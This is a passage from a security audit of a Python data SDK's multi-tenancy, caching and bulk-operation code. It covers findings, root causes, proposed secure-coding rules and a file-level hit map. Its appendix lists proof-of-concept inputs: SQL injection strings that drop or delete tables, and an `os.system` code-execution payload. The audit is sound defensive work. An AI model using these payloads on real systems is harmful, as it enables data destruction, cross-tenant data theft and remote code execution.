fine as long as params are not interpolated, but the log line is a
single unstructured string. `observability.md` MUST NOT Rule 3:
structured fields, not f-strings. Widespread.

### M14 — `TenantMigrationManager.rollback_migration` signature overloading

**File/line:** `core/multi_tenancy.py:831–845`

```python
def rollback_migration(self, db, tenant_id: str, migration_id: str = None) -> bool:
    if migration_id is None:
        migration_id = tenant_id
        tenant_id = db
        db = None
    ...
```

Dynamic argument shuffling is a ticking time bomb. A caller passing
`rollback_migration(real_db, actual_tenant, None)` will get
`tenant_id = real_db`, `migration_id = actual_tenant`, and proceed to
"rollback migration named 'acme-tenant' for tenant '<db object>'".

## LOW / hygiene

### L1 — Docstring lies about "advanced" and "enterprise"

Many files claim "Enterprise" or "advanced" in docstrings while
shipping stubs. `features/multi_tenant.py` module docstring,
`tenancy/interceptor.py` docstring, `core/multi_tenancy.py`
module docstring. Delete the marketing adjectives.
`rules/independence.md` forbids enterprise/community splits.

### L2 — `TenantContext.set_current` inner class is a nested red flag

**File/lines:** `core/multi_tenancy.py:126–144` — defines a
`TenantContextManager` inner class inside a classmethod. That
pattern is a workaround for not using `@contextmanager`. Replace
with `contextlib.contextmanager`.

### L3 — `require_tenant_context` decorator lives in the stub file

**File/line:** `core/multi_tenancy.py:1036–1045` — decorator defined
but no callers found. Dead code per `zero-tolerance.md` philosophy.

### L4 — `TenantRegistry.__init__` keeps 3 parallel dicts

**File/lines:** `core/multi_tenancy.py:180–193` — `self._tenants`,
`self._tenant_schemas`, `self._tenant_databases`. Two are derivable
from the first. Duplication invites divergence.

### L5 — `tenancy/security.py` `SecurityAuditLog.timestamp` uses naive `datetime.now()`

**File/line:** `tenancy/security.py:513` — `datetime.now()` not
`datetime.now(timezone.utc)`. Non-UTC timestamps in an audit log
are ambiguous across zones.

### L6 — Logging uses `datetime.utcnow()`

**Files:** multiple. Python 3.12 deprecates `utcnow()`. See
`zero-tolerance.md` Rule 1 (no deprecation warnings).

### L7 — `test_redis_connection` short-circuit on `redis_available()`

**File/line:** `cache/auto_detection.py:61` — returns `False` silently
if the redis module is not installed. Should raise `ImportError`
with the extras name (`pip install kailash-dataflow[redis]`) per
`rules/dependencies.md` "Exception: Optional Extras with Loud
Failure".

### L8 — `detect_pii_columns` PII patterns are English-only

**File/lines:** `trust/query_wrapper.py:66–81` — only matches English
column names (`ssn`, `passport`, `dob`). A column named
`numero_seguro_social` is not detected. Acceptable LOW for now;
file a feature issue for internationalized PII patterns.

### L9 — `TenantIsolationStrategy.apply_isolation` abstract contract says "Apply tenant isolation to a query" but the three implementations return wildly different strings

No stable contract. LOW hygiene but signals the deeper architectural
mess.

## The three fault lines

1. **Parallel implementations** (five tenancy modules, seven tenancy
   classes, three audit log systems) — this IS the CO "default to
   primitives, drop to raw" failure mode. There is no single
   canonical path. Adding a new tenant field means touching five
   files and hoping the caller picks the right one. Every
   implementation has its own set of bugs and its own cache of
   truth. The C1 f-string injection is live because the regex path
   and the parameterized path both exist, and callers can reach
   either. **Root cause: no `framework-first` enforcement for
   tenancy.**

2. **Stubs returning `True`** — `SchemaIsolationStrategy.create_tenant_resources`,
   `RowLevelSecurityStrategy.create_tenant_resources`,
   `TenantMigrationManager._extract_tenant_data`,
   `MultiTenantManager.delete_tenant`,
   `TenantSecurityManager.encrypt_tenant_data`. They all log "in a
   real implementation, this would..." and return success. The fault
   line is that these were added in TDD mode to pass a test, then
   never filled in. **Root cause: `zero-tolerance.md` Rules 2 and 6
   were not enforced at merge.**

3. **Dead parameter passthrough** — `tenant_extractor` in
   `FabricRuntime.__init__`, `namespace` in `CacheKeyGenerator.__init__`,
   `redis_url` in `PipelineExecutor.__init__` (issue #354), `multi_tenant`
   in `ProductRegistration` — all accepted, validated, stored, never
   invoked. Every one of them is a docstring lie that passes the
   linter because the parameter IS used (it's assigned to `self._x`).
   **Root cause: no test asserts that the stored value reaches the
   code path the docstring promises.**

## Rule gaps

The following rules do NOT yet exist or do not cover what this audit
found. I recommend adding them before implementation:

### New rule: `rules/tenant-isolation.md`

```markdown
## Canonical tenancy path

1. All tenant context MUST flow through `dataflow/core/tenant_context.py`'s
   `TenantContextSwitch` and the `_current_tenant` ContextVar.
2. All parallel tenancy modules in `dataflow/` are BLOCKED:
   `core/multi_tenancy.py`, `features/multi_tenant.py`,
   `core/tenant_security.py`, `tenancy/*` (except `interceptor.py`
   if it is promoted to canonical).
3. Cache keys MUST accept an explicit `tenant_id` positional parameter
   (first segment after prefix/version). No "constructor namespace"
   shortcut.
4. Any code path that handles multi-tenant data MUST call
   `get_current_tenant_id()` before executing the query. Missing
   tenant on a multi-tenant-declared model → raise, not default.
5. `tenant_id` values MUST pass `validate_identifier` (strict
   `^[a-zA-Z_][a-zA-Z0-9_-]{0,62}$`) at the outermost public entry
   point (`set_tenant_context`, `register_tenant`, middleware header
   extraction).
6. No f-string interpolation of `tenant_id` into SQL under any
   circumstance. Always parameterized placeholder.
```

### Extend `rules/security.md`

Add: "No `eval()` or `exec()` on any value read from a database
column or workflow parameter. Even `ast.literal_eval` requires a
type-check on the result."

Add: "No custom encryption functions. Delegate to
`kailash.crypto` or the trust-plane SDK. A function named
`encrypt_*` MUST call a vetted primitive (Fernet, NaCl,
KMS). Returning a formatted string is BLOCKED."

### Extend `rules/observability.md`

Add MUST NOT: "No logging of database URLs, Redis URLs, webhook
URLs, or any URL containing a `@` before the hostname without
masking via `mask_sensitive_values`."

### Extend `rules/zero-tolerance.md` Rule 2

Add: "No `# In a real implementation, this would ...` comments.
Either implement or delete the method."

### New rule: `rules/dataflow-identifier-safety.md`

```markdown
## Identifier safety for SQL-building modules

- Every SQL-building helper in `dataflow/` MUST accept identifier
  arguments only after they pass `dataflow.query.models.validate_identifier`.
- Every value MUST be passed as a `?` placeholder.
- f-string SQL is permitted ONLY when every interpolation site is an
  already-validated identifier AND every value is `?`.
- `_quote_identifier` / any dialect quoting helper MUST assert that
  `validate_identifier` passed before calling it.
- `AsyncSQLDatabaseNode(validate_queries=False)` is BLOCKED.
```

## Cross-SDK parallels

- `crates/kailash-dataflow/` (Rust): Needs verification whether Rust
  has its own `RowLevelSecurityStrategy`-equivalent. If yes, the
  same SQL injection class likely exists. File `cross-sdk` issue on
  `esperie-enterprise/kailash-rs` naming C1.
- `crates/kailash-dataflow/src/` cache key: check if cache keys are
  tenant-scoped in Rust. If yes, Python is behind; if no, both are
  broken.
- Trust audit store: Rust almost certainly has a matching
  `DataFlowAuditStore`. The same H6 (unbounded in-memory list, no
  persistence) is likely present.

**Action:** After this audit is approved, launch a parallel Rust
inspection agent with this file as input and file a cross-SDK issue
for every CRITICAL and HIGH finding that applies to both stacks, per
`rules/cross-sdk-inspection.md`.

---

## Appendix A — File-level hit map

| File                        | Severity | Findings                                                                 |
| --------------------------- | -------- | ------------------------------------------------------------------------ |
| `core/multi_tenancy.py`     | CRITICAL | C1 (13 SQL sites), C4, H2, M3, M8, M9, M10, M13, M14, L1, L2, L3, L4, L9 |
| `core/tenant_context.py`    | HIGH     | H3 (TODO-155)                                                            |
| `core/tenant_security.py`   | LOW      | dead shim, L1                                                            |
| `core/tenant_migration.py`  | LOW      | parallel impl, H2                                                        |
| `tenancy/interceptor.py`    | MEDIUM   | M7 (regex parser), best-of-breed candidate                               |
| `tenancy/security.py`       | HIGH     | H8, H9, L5                                                               |
| `features/multi_tenant.py`  | HIGH     | H1 (fake), L1                                                            |
| `trust/multi_tenant.py`     | HIGH     | H4, H5, H7, M8                                                           |
| `trust/audit.py`            | HIGH     | H6, M12                                                                  |
| `trust/query_wrapper.py`    | MEDIUM   | M1, M2, L8                                                               |
| `cache/key_generator.py`    | CRITICAL | C5                                                                       |
| `cache/auto_detection.py`   | HIGH     | H11, L7                                                                  |
| `features/express.py`       | CRITICAL | C5 (cache) + M8                                                          |
| `fabric/pipeline.py`        | CRITICAL | C6, C7                                                                   |
| `fabric/runtime.py`         | CRITICAL | C7                                                                       |
| `fabric/serving.py`         | CRITICAL | C7 (no tenant handling)                                                  |
| `fabric/change_detector.py` | MEDIUM   | M6                                                                       |
| `fabric/webhooks.py`        | MEDIUM   | M4                                                                       |
| `nodes/bulk_create.py`      | CRITICAL | C8                                                                       |
| `nodes/bulk_update.py`      | CRITICAL | C8, H13                                                                  |
| `nodes/bulk_delete.py`      | CRITICAL | C8                                                                       |
| `nodes/dynamic_update.py`   | CRITICAL | C3                                                                       |
| `semantic/search.py`        | CRITICAL | C2                                                                       |
| `database/query_builder.py` | HIGH     | H10                                                                      |
| `migrations/*` (30+ files)  | HIGH     | H12                                                                      |

## Appendix B — PoC summary table

| #   | Vector                           | Target parameter                              | Minimal payload                 | Impact                       |
| --- | -------------------------------- | --------------------------------------------- | ------------------------------- | ---------------------------- |
| C1  | `tenant_id`                      | `set_tenant_context(tenant_id=...)`           | `a' OR '1'='1`                  | Full cross-tenant SELECT     |
| C1  | `tenant_id`                      | `create_tenant_policy(tenant_id=...)`         | `x"; DROP TABLE users; --`      | Full DB compromise           |
| C2  | `embedding` column write         | `find_similar_examples(example_id=...)`       | `__import__('os').system('id')` | RCE on worker                |
| C3  | `prepare_code` node param        | `workflow.add_node("DynamicUpdateNode", ...)` | any Python expression           | RCE on worker                |
| C5  | N/A (passive)                    | Tenant-A write + tenant-B read                | empty                           | Cached row cross-tenant leak |
| C7  | Any multi_tenant product request | `FabricRuntime.serve(...)`                    | `X-Tenant-Id: anything`         | Wrong-tenant cache served    |
| C8  | `ids` on `BulkDeleteNode`        | `node.async_run(ids=...)`                     | `["1); DELETE FROM t; --"]`     | DML injection                |
| H10 | `field` on `QueryBuilder.where`  | `.where('f"; DROP TABLE t; --', "$eq", 1)`    | identifier injection            | DML injection                |
| H11 | `REDIS_URL` env var              | container start                               | `redis://u:p@prod/0`            | Password in INFO log         |

(End of file.)
